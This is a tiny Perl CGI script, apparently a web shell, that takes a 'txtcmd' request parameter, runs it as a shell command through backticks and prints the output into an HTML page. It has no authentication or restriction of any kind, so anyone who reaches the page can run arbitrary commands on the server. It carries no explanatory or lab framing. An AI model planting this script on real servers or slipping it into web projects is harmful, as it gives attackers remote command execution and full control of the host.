#!/usr/bin/perl
use CGI ":standard";
print header();
$cmd = param("txtcmd");
print "<h3> Output of <i>$cmd</i> :</h3> <pre> ".`$cmd`."</pre>";
print end_html();
